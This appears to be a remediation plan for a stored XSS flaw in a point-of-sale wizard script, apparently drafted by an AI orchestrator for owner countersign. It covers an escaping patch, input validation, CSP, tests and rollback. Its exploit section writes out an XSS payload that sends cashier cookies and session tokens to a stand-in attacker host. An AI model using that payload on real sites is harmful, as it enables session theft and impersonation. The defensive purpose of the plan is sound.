# LOCK — POS Wizard Stored XSS Heal (escapeHtml)

- **Date**: 2026-05-17
- **Frozen-zone target**: `public/js/pos-wizard.js` (CLAUDE.md §7 — POS Vanilla JS wizard, owner-protected)
- **Severity**: P0 — Stored XSS in cashier-authenticated origin → Sanctum token / PCI-DSS scope compromise
- **LOCK requestor**: Claude orchestrator (RED-team finding 2026-05-17)
- **Owner countersign required**: YES (CLAUDE.md §10 human-gate — frozen-zone touch)
- **Branch target**: `xss-heal-pos-wizard-2026-05` (dedicated, off `main`)
- **Estimated wall-clock**: ~1 working day (4-6h implementer + 1-2h owner review)

---

## Section 1 — Justification (owner-gate evidence)

### 1.1 Vulnerability surface

The frozen wizard `public/js/pos-wizard.js` builds option/garniture/sauce/viande/menu HTML strings via raw `+ entity.name +` concatenation, then assigns the result to `innerHTML` of the wizard root (`#pos-wizard-content`). Every interpolated `.name` comes from the Items REST payload (`/api/items`, `/api/extras`, `/api/variations`) — admin-editable fields stored in the `items` table without any frontend HTML escaping.

**Confirmed innerHTML sinks (verified `grep -n "innerHTML\s*=" pos-wizard.js`, 2026-05-17, 5964 LOC)**:

| # | Line | Sink                              | User-controlled string interpolated upstream |
|---|------|-----------------------------------|----------------------------------------------|
| 1 | 4773 | `wizardEl.innerHTML = renderSinglePage()` | aggregated `h` built from all renderers below |
| 2 | 5135 | `wizardEl.innerHTML = renderSinglePage()` | re-render after option toggle |
| 3 | 4945 | `sauceInfoEl.innerHTML = newHtml` | sauce names concatenated |
| 4 | 4958 | `sfInfoEl.innerHTML = newHtml` | supp-libre sauce names |
| 5 | 5093 | `infoEl.innerHTML = newHtml` | option names |
| 6 | 4986 | `btn.innerHTML = emoji + ' ✓ ' + name` | toggle-include garniture name |
| 7 | 4989 | `btn.innerHTML = emoji + ' ✕ Sans ' + name` | toggle-exclude garniture name |
| 8 | 3329 | `btn.innerHTML = emoji + ' ' + (isIncluded ? '✓ ' + displayName : '✕ Sans ' + displayName)` | live label toggle |
| 9 | 1255 | `h += '<button ... onclick="... this.innerHTML=...">'` | static, but injected via aggregated `h` |
| 10| 1642 | idem viande-voir-plus | static, but injected via aggregated `h` |

**`insertAdjacentHTML` sink (1 occurrence)**:

| # | Line | Sink |
|---|------|------|
| 11| 4851 | `headerEl.insertAdjacentHTML('beforeend', '<span class="viande-complete-badge">✅ Complet</span>')` |

Static literal — currently safe. Wrapped defensively in scope (Section 2).

**Upstream raw-name interpolations feeding sinks 1-2-3-4-5 (verified grep)**:

- L1195 — `'<span class="viande-name">' + viande.name + '</span>'`
- L1246 / L1343 / L1568 / L1672 / L1781 / L1924 / L1964 / L2020 — `'<span class="option-name">' + sauce.name + '</span>'`
- L1359 / L1375 / L1391 — `'<span class="option-name">' + item.name + '</span>'`
- L1628 — `'<span class="viande-name">' + viande.name + '</span>'` (second context)
- L1855 — `'<div class="menu-name">' + addon.name + '</div>'`

**Total upstream sinks requiring escape**: 13 confirmed (mission brief estimated 10 — verified higher).

### 1.2 Exploit reproduction

1. Attacker has admin credentials (or compromised Branch Manager via lateral movement).
2. Attacker creates Item via `/admin/items/create` with:
   ```
   name = Burger</span><img src=x onerror=fetch('//atk.tld/?c='+document.cookie+'&t='+localStorage.getItem('sanctum_token'))>
   ```
3. `ItemRequest::rules()` currently validates `name` as `required|string|max:N` + `Rule::unique('items','name')`. No `strip_tags` / regex blocking `<>`. Payload persists.
4. Cashier logs into `/admin/pos` (Sanctum session, `pos:order` ability).
5. Cashier taps the new item → `pos-wizard.js` renders option list → `viande.name` (the malicious string) is concatenated into `h` → `wizardEl.innerHTML = renderSinglePage()` at L4773 fires.
6. `<img onerror>` executes in `pos-wizard.js` origin (cashier-authenticated). Cookie + localStorage Sanctum token exfiltrated to `atk.tld`.
7. Attacker replays token outside the network → place orders, read fiscal data, trigger discounts, exfiltrate PII.

### 1.3 Severity P0

- **PCI-DSS**: cashier origin processes card-payment intents. XSS in this origin = stored XSS in a PCI-scoped surface → audit failure + breach notification trigger.
- **Sanctum compromise**: token TTL 480min (CLAUDE.md §9) means an exfiltrated token = ~8h of authenticated impersonation.
- **NF525**: a token-impersonator can fabricate orders → fiscal_sequence_no consumed → audit chain bound to attacker actions.
- **Frozen-zone**: CLAUDE.md §7 — production-validated. Touch requires this LOCK.

### 1.4 Why backend mitigation alone is insufficient

- `strip_tags` only removes well-formed tags; cannot catch attribute-injection (`name = "x onerror=alert(1)"`) when rendered inside an HTML attribute or template literal context.
- Encoding bypass (HTML entities, Unicode normalization) defeats naive regex blocklists.
- `name` field has legitimate special-char use (Crème brûlée, apostrophes, ampersands) — overly strict allowlists break menu UX.
- Defense-in-depth standard: **always escape at the sink**. Backend filter is a complement, not a substitute. The sink-side `escapeHtml` is the canonical OWASP recommendation for Vanilla JS innerHTML writes.
- CSP `script-src 'self'` (Section 3) blocks inline `<script>` but does **not** block `<img onerror>` resource fetches by default; only `script-src` with strict-dynamic + no `unsafe-inline` mitigates partially, and CSP is still subject to bypasses on legacy browsers.

---

## Section 2 — Scope (precise patch)

### 2.1 Helper (top of file, ~7 LOC)

Inject at the top of `public/js/pos-wizard.js`, immediately after the IIFE opening and constants block (around L20-L40, before any renderer function declaration):

```js
// [XSS-HEAL 2026-05-17] OWASP HTML escape — all user-controlled strings
// rendered via innerHTML MUST pass through this helper.
function escapeHtml(str) {
    if (str === null || str === undefined) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}
```

### 2.2 Wrap all `.name` interpolations feeding innerHTML

Replace 13 sites — pattern `+ entity.name +` → `+ escapeHtml(entity.name) +`. Concrete diffs:

| Line | Before | After |
|------|--------|-------|
| 1195 | `'<span class="viande-name">' + viande.name + '</span>'` | `'<span class="viande-name">' + escapeHtml(viande.name) + '</span>'` |
| 1246 | `'<span class="option-name">' + sauce.name + '</span>'` | `'... + escapeHtml(sauce.name) + ...'` |
| 1343 | idem sauce.name | idem |
| 1359 | `'<span class="option-name">' + item.name + '</span>'` | `'... + escapeHtml(item.name) + ...'` |
| 1375 | idem item.name | idem |
| 1391 | idem item.name | idem |
| 1568 | sauce.name | escapeHtml(sauce.name) |
| 1628 | viande.name | escapeHtml(viande.name) |
| 1672 | sauce.name | escapeHtml(sauce.name) |
| 1781 | sauce.name | escapeHtml(sauce.name) |
| 1855 | `'<div class="menu-name">' + addon.name + '</div>'` | escapeHtml(addon.name) |
| 1924 | sauce.name | escapeHtml(sauce.name) |
| 1964 | sauce.name | escapeHtml(sauce.name) |
| 2020 | sauce.name | escapeHtml(sauce.name) |

### 2.3 Wrap `btn.innerHTML = ...` writes that interpolate `name` / `displayName`

| Line | Wrap |
|------|------|
| 3329 | `btn.innerHTML = emoji + ' ' + (isIncluded ? '✓ ' + escapeHtml(displayName) : '✕ Sans ' + escapeHtml(displayName))` |
| 4986 | `btn.innerHTML = emoji + ' ✓ ' + escapeHtml(name)` |
| 4989 | `btn.innerHTML = emoji + ' ✕ Sans ' + escapeHtml(name)` |

### 2.4 Defensive review of L4773, L5135, L4945, L4958, L5093

These five sinks consume already-escaped concatenated strings (post 2.2/2.3). **No change at the sink itself** — escaping happens upstream where the user data enters the HTML stream. Add an inline code-comment marker (`// [XSS-HEAL] consumes escapeHtml-clean string`) for sentinel-friendliness.

### 2.5 L4851 `insertAdjacentHTML` (literal)

Literal `'<span class="viande-complete-badge">✅ Complet</span>'` — no user data. **No code change**, but add comment `// [XSS-HEAL] static literal — no interpolation`.

### 2.6 Out-of-scope (NOT in this LOCK)

- `extra_item.name` at L3623 — pushed into `supParts` array → joined into a comment receipt string → `textContent` path (verified safe). Skip.
- `sauce.name` at L2124/2126/2310/2312/2440/2603/2738/2912/3167/3801/3809 — feed into plain-text `sauceNames`/`sfNames`/comments → `textContent` or array-to-string. Skip.
- L415/794/895 — `.toLowerCase()` checks against literals — internal logic, no sink. Skip.
- L1854 — emoji lookup, static string. Skip.

**Final diff estimate**: ~50-60 LOC modified (1 helper added + 17 sink wraps + 5 marker comments). Single commit, single file.

---

## Section 3 — Defense-in-depth (backend tier)

### 3.1 `ItemRequest` enhancement (`app/Http/Requests/ItemRequest.php`)

Current rule (verified L33):
```php
'name' => [
    'required', 'string',
    Rule::unique('items','name')->whereNull('deleted_at')->ignore($this->route('item.id')),
],
```

Add to `prepareForValidation()` and rule chain:
```php
protected function prepareForValidation(): void
{
    if ($this->has('name')) {
        $clean = strip_tags($this->input('name'));
        $clean = preg_replace('/[<>]/u', '', $clean);
        $this->merge(['name' => $clean]);
    }
}

// rule augment:
'name' => [
    'required', 'string', 'max:120',
    'regex:/^[^<>]*$/u',
    Rule::unique('items','name')->whereNull('deleted_at')->ignore($this->route('item.id')),
],
```

Mirror the same enhancement in: `ItemVariationRequest`, `ItemAddonRequest`, `ItemExtraRequest`, `ItemCategoryRequest`, `ItemAttributeRequest`. Verified all six request classes exist (`ls app/Http/Requests/`).

### 3.2 CSP header (existing infrastructure)

Verified existing middleware: `app/Http/Middleware/ContentSecurityPolicyHeader.php` (reads `config('security.csp.mode')` + `config('security.csp.directives')`).

Existing sentinel: `tests/js/sentinels/cspMigratedToHttpHeader.spec.js`.

**No code change required** — verify in pre-deploy:
- `config/security.php` `csp.mode = enforce` (not `report_only`) in production env
- Directive includes `default-src 'self'; script-src 'self' 'nonce-{X}'; img-src 'self' data: blob:` (or stricter)
- Owner deploy doc updates: ensure CSP enforce-mode toggle is part of post-LOCK release.

### 3.3 Why both layers (Section 2 + Section 3)

Per OWASP XSS Prevention Cheat Sheet:
- **Layer 1 (sink-side escape, Section 2)** — primary, deterministic.
- **Layer 2 (input validation, Section 3.1)** — reduces stored-payload surface.
- **Layer 3 (CSP, Section 3.2)** — defense-in-depth if Layer 1 regressions ever ship.

Layer 1 alone is sufficient; Layers 2-3 are belt-and-suspenders for a P0 frozen-zone touch.

---

## Section 4 — Test plan

### 4.1 NEW sentinel — `tests/js/sentinels/posWizardEscapeHtmlSinks.spec.js`

```js
import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';

const SOURCE = fs.readFileSync(
    path.resolve(__dirname, '../../../public/js/pos-wizard.js'),
    'utf-8'
);

describe('pos-wizard.js XSS sink escape sentinel', () => {
    it('defines escapeHtml helper', () => {
        expect(SOURCE).toMatch(/function\s+escapeHtml\s*\(/);
        expect(SOURCE).toMatch(/\.replace\(\/&\/g,\s*['"]&amp;['"]\)/);
        expect(SOURCE).toMatch(/\.replace\(\/</g,\s*['"]&lt;['"]\)/);
    });

    it('escapes all viande.name innerHTML interpolations', () => {
        const unsafe = SOURCE.match(/\+\s*viande\.name\s*\+/g) || [];
        const safe = SOURCE.match(/escapeHtml\(viande\.name\)/g) || [];
        expect(safe.length).toBeGreaterThanOrEqual(2);
        expect(unsafe.length).toBe(0);
    });

    it('escapes all sauce.name innerHTML interpolations in HTML string contexts', () => {
        // Allow textContent/array push contexts; block <span>...sauce.name...</span>
        const unsafeHtml = SOURCE.match(/option-name['"]>\s*['"]\s*\+\s*sauce\.name\s*\+/g) || [];
        expect(unsafeHtml.length).toBe(0);
    });

    it('escapes item.name in garniture/supplement option rendering', () => {
        const unsafe = SOURCE.match(/option-name['"]>\s*['"]\s*\+\s*item\.name\s*\+/g) || [];
        expect(unsafe.length).toBe(0);
        expect(SOURCE).toMatch(/escapeHtml\(item\.name\)/);
    });

    it('escapes addon.name in menu rendering', () => {
        const unsafe = SOURCE.match(/menu-name['"]>\s*['"]\s*\+\s*addon\.name\s*\+/g) || [];
        expect(unsafe.length).toBe(0);
    });

    it('escapes btn.innerHTML writes that interpolate name/displayName', () => {
        const matches = SOURCE.match(/btn\.innerHTML\s*=\s*[^;]+name/g) || [];
        for (const m of matches) {
            expect(m).toMatch(/escapeHtml/);
        }
    });
});
```

### 4.2 Backend test — `tests/Feature/Admin/ItemNameXssSanitizationTest.php`

```php
public function test_item_request_strips_html_tags_from_name(): void
{
    $this->actingAs($this->adminUser());
    $payload = ['name' => 'Burger<img src=x onerror=alert(1)>', /* ... */];
    $response = $this->postJson('/admin/items', $payload);
    $response->assertStatus(422); // regex /^[^<>]*$/u rejects
}

public function test_item_request_strips_safe_special_chars_pass(): void
{
    $this->actingAs($this->adminUser());
    $payload = ['name' => "Crème brûlée à l'ananas", /* ... */];
    $response = $this->postJson('/admin/items', $payload);
    $response->assertStatus(201);
}
```

### 4.3 E2E Playwright — `tests/e2e/security/pos-wizard-xss.spec.js`

```js
test('POS wizard does not execute XSS from item.name', async ({ page }) => {
    // 1. Seed an Item with XSS payload via admin
    await page.goto('/admin/items/create');
    // ... authenticate, fill form with malicious name, submit
    // Expect 422 (Section 3.1 blocks)

    // 2. Force-seed via DB factory (bypass request validation to simulate
    //    pre-3.1 historical data) — assert sink-side escape still neutralizes
    await page.evaluate(() => window.__testSeedItem({ name: '<img src=x onerror=window.__xss=1>' }));
    await page.goto('/admin/pos');
    await page.click('[data-testid="pos-item-malicious"]');

    const xssFired = await page.evaluate(() => window.__xss === 1);
    expect(xssFired).toBe(false);

    // 3. Confirm rendered text shows the literal string (escaped)
    const wizardText = await page.locator('#pos-wizard-content').textContent();
    expect(wizardText).toContain('<img src=x onerror=window.__xss=1>');
});
```

### 4.4 Visual mandate (CLAUDE.md §6)

Post-patch Playwright capture on `/admin/pos`:
- Open wizard for: 1 sandwich, 1 menu, 1 viande-multi-choice item.
- Compare screenshots vs pre-patch baseline (`reports/audit/pos-baseline-pre-xss-heal-2026-05-17/`).
- Assert: no visual diff > 1% pixels on safe inputs (regression check that escape does not break rendering).

---

## Section 5 — Rollback procedure

1. **Pre-patch backup**:
   ```bash
   cp public/js/pos-wizard.js public/js/pos-wizard.js.pre-xss-heal-2026-05-17.bak
   git add public/js/pos-wizard.js.pre-xss-heal-2026-05-17.bak
   git commit -m "backup(pos-wizard): pre-XSS-heal snapshot 2026-05-17"
   ```

2. **Patch commit** is single-file, single-commit, atomic. Revertable via:
   ```bash
   git revert <patch-sha>
   ```

3. **No DB migration** introduced by the wizard patch itself. Section 3.1 backend rules add no schema changes — request-layer only, revertable by file revert.

4. **CSP toggle** (Section 3.2) is a config flip — revert via `config/security.php` rollback. No data loss.

5. **Failure mode if patch ships broken**:
   - Wizard renders escaped entities literally (`&lt;br&gt;` visible) → cosmetic regression only, no business loss.
   - Owner can revert + redeploy in <10min via standard release pipeline.
   - Backup `.bak` file restorable byte-identical.

6. **Post-rollback action**: re-open this LOCK with updated scope; do not leave production unpatched (P0 still active).

---

## Section 6 — Owner gate checklist

- [ ] Owner reads Sections 1-5 and confirms exploit reproduction understood
- [ ] Owner countersigns this LOCK plan (signature in §6.2 below before any code change)
- [ ] Implementer subagent creates branch `xss-heal-pos-wizard-2026-05` off `main`
- [ ] Backup commit (`.bak` file) pushed first, separate from patch commit
- [ ] Patch commit applied — 13 upstream wraps + 3 btn.innerHTML wraps + helper + comment markers
- [ ] Vitest sentinel `posWizardEscapeHtmlSinks.spec.js` green
- [ ] Full Vitest suite green (no regression in existing kiosk/POS specs)
- [ ] PHPUnit `tests/Feature/Admin/ItemNameXssSanitizationTest.php` green
- [ ] PHPUnit full suite green
- [ ] E2E `tests/e2e/security/pos-wizard-xss.spec.js` green (XSS does not fire)
- [ ] Visual mandate post-patch — 3 wizard captures match baseline ±1% pixels
- [ ] Owner reviews diff (`git diff main..xss-heal-pos-wizard-2026-05`) and countersigns final patch
- [ ] CSP enforce-mode confirmed in production `config/security.php` deploy slot
- [ ] Merge to `main` via PR (no force-push, no direct merge)
- [ ] Production deploy includes CSP header refresh + cache-bust for `pos-wizard.js` asset URL

### 6.2 Signatures

| Role             | Name | Date | Signature |
|------------------|------|------|-----------|
| LOCK requestor   | Claude (orchestrator) | 2026-05-17 | (digital — this commit) |
| Owner countersign (pre-patch) |  |  |  |
| Implementer subagent (post-patch) |  |  |  |
| Owner final approval (pre-merge) |  |  |  |

---

## Section 7 — Estimated effort

| Phase | Duration |
|-------|----------|
| Implementer subagent — helper + 16 sink wraps + marker comments | 1.5h |
| Implementer subagent — Vitest sentinel authored + green | 1h |
| Implementer subagent — Section 3.1 backend rules across 6 FormRequests | 1h |
| Implementer subagent — PHPUnit + E2E specs authored + green | 1.5h |
| Implementer subagent — visual capture baseline + post-patch compare | 0.5h |
| **Implementer subtotal** | **5.5h** |
| LOCK gate — owner pre-patch review + countersign | 0.5h |
| LOCK gate — owner final diff review + countersign | 1h |
| Production deploy + CSP toggle verification | 0.5h |
| **Owner + ops subtotal** | **2h** |
| **Total wall-clock** | **~1 working day (7.5h)** |

---

## Appendix A — Anti-drift guardrails

- **DO NOT** touch any other LOC in `pos-wizard.js` outside Section 2 scope (no formatting, no rename, no comment churn beyond the markers).
- **DO NOT** mix this LOCK with any other heal or feature work — branch must contain only the XSS heal + backup commit.
- **DO NOT** weaken or alter `BranchScope`, `PricingService`, `FiscalSequenceService`, or any other CLAUDE.md §7-§8 frozen file as a "while-we're-here" change.
- **DO NOT** auto-loop Claude self-correct (CLAUDE.md §5 step 7) on this LOCK — owner gate is mandatory before each retry.
- **DO NOT** push to `main` directly — PR only.

## Appendix B — Cross-references

- CLAUDE.md §7 — Frozen Zones (POS Vanilla JS wizard)
- CLAUDE.md §10 — Decision Framework + Human gate
- CLAUDE.md §6 — Visual Test Mandate
- OWASP XSS Prevention Cheat Sheet (Rule #1: HTML Entity Encoding)
- PCI-DSS v4.0 §6.4.4 — Web application vulnerability remediation
- NF525 Loi de Finance — fiscal chain integrity (token-impersonation → audit chain corruption risk)
